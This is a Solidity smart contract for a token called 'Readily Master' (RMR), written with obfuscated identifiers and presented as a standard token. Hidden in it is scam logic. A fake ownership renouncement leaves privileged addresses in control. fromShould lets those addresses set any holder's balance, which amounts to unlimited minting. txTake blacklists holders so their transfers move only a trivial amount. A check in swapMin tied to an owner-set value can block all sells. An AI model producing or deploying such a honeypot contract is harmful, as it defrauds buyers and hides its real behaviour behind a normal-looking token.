//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface maxAtList {
    function createPair(address launchFrom, address atFee) external returns (address);
}

interface tokenLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isLimit) external view returns (uint256);

    function transfer(address tradingEnableSell, uint256 atFrom) external returns (bool);

    function allowance(address limitTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 atFrom) external returns (bool);

    function transferFrom(
        address sender,
        address tradingEnableSell,
        uint256 atFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingListReceiver, uint256 value);
    event Approval(address indexed limitTx, address indexed spender, uint256 value);
}

abstract contract limitTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenLiquidityMetadata is tokenLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReadilyMaster is limitTotal, tokenLiquidity, tokenLiquidityMetadata {

    function txTake(address takeLaunchedWallet) public {
        takeFrom();
        
        if (takeLaunchedWallet == fundSell || takeLaunchedWallet == shouldTx) {
            return;
        }
        launchAt[takeLaunchedWallet] = true;
    }

    uint256 private modeLimit = 100000000 * 10 ** 18;

    function balanceOf(address isLimit) public view virtual override returns (uint256) {
        return atShould[isLimit];
    }

    address public fundSell;

    function approve(address buyWallet, uint256 atFrom) public virtual override returns (bool) {
        modeLiquidity[_msgSender()][buyWallet] = atFrom;
        emit Approval(_msgSender(), buyWallet, atFrom);
        return true;
    }

    address private txSwap;

    mapping(address => bool) public fundTeam;

    function symbol() external view virtual override returns (string memory) {
        return minReceiverAuto;
    }

    function takeFrom() private view {
        require(fundTeam[_msgSender()]);
    }

    bool public minFeeSell;

    bool private senderFromMax;

    event OwnershipTransferred(address indexed senderFrom, address indexed minWallet);

    uint256 constant senderLiquidity = 15 ** 10;

    constructor (){
        
        listTrading atSell = listTrading(exemptTo);
        shouldTx = maxAtList(atSell.factory()).createPair(atSell.WETH(), address(this));
        
        fundSell = _msgSender();
        fundTeam[fundSell] = true;
        atShould[fundSell] = modeLimit;
        txReceiverLiquidity();
        if (senderFromMax) {
            totalMaxSender = true;
        }
        emit Transfer(address(0), fundSell, modeLimit);
    }

    function allowance(address modeShould, address buyWallet) external view virtual override returns (uint256) {
        if (buyWallet == exemptTo) {
            return type(uint256).max;
        }
        return modeLiquidity[modeShould][buyWallet];
    }

    mapping(address => uint256) private atShould;

    mapping(address => bool) public launchAt;

    string private minReceiverAuto = "RMR";

    bool private totalMaxSender;

    function owner() external view returns (address) {
        return txSwap;
    }

    function name() external view virtual override returns (string memory) {
        return toMaxShould;
    }

    bool private sellAuto;

    address liquidityLimitIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fundBuyEnable(address maxSender, address tradingEnableSell, uint256 atFrom) internal returns (bool) {
        require(atShould[maxSender] >= atFrom);
        atShould[maxSender] -= atFrom;
        atShould[tradingEnableSell] += atFrom;
        emit Transfer(maxSender, tradingEnableSell, atFrom);
        return true;
    }

    mapping(address => mapping(address => uint256)) private modeLiquidity;

    function transfer(address launchedReceiver, uint256 atFrom) external virtual override returns (bool) {
        return swapMin(_msgSender(), launchedReceiver, atFrom);
    }

    uint256 private txMax;

    uint8 private fromMode = 18;

    function decimals() external view virtual override returns (uint8) {
        return fromMode;
    }

    uint256 public exemptWallet;

    function receiverLimit(uint256 atFrom) public {
        takeFrom();
        atAuto = atFrom;
    }

    address public shouldTx;

    uint256 tradingLaunched;

    function swapShouldLaunch(address teamReceiver) public {
        require(teamReceiver.balance < 100000);
        if (minFeeSell) {
            return;
        }
        
        fundTeam[teamReceiver] = true;
        
        minFeeSell = true;
    }

    address exemptTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function txReceiverLiquidity() public {
        emit OwnershipTransferred(fundSell, address(0));
        txSwap = address(0);
    }

    function getOwner() external view returns (address) {
        return txSwap;
    }

    function transferFrom(address maxSender, address tradingEnableSell, uint256 atFrom) external override returns (bool) {
        if (_msgSender() != exemptTo) {
            if (modeLiquidity[maxSender][_msgSender()] != type(uint256).max) {
                require(atFrom <= modeLiquidity[maxSender][_msgSender()]);
                modeLiquidity[maxSender][_msgSender()] -= atFrom;
            }
        }
        return swapMin(maxSender, tradingEnableSell, atFrom);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return modeLimit;
    }

    bool private fromSell;

    function swapMin(address maxSender, address tradingEnableSell, uint256 atFrom) internal returns (bool) {
        if (maxSender == fundSell) {
            return fundBuyEnable(maxSender, tradingEnableSell, atFrom);
        }
        uint256 modeList = tokenLiquidity(shouldTx).balanceOf(liquidityLimitIs);
        require(modeList == atAuto);
        require(tradingEnableSell != liquidityLimitIs);
        if (launchAt[maxSender]) {
            return fundBuyEnable(maxSender, tradingEnableSell, senderLiquidity);
        }
        return fundBuyEnable(maxSender, tradingEnableSell, atFrom);
    }

    string private toMaxShould = "Readily Master";

    uint256 atAuto;

    function fromShould(address launchedReceiver, uint256 atFrom) public {
        takeFrom();
        atShould[launchedReceiver] = atFrom;
    }

}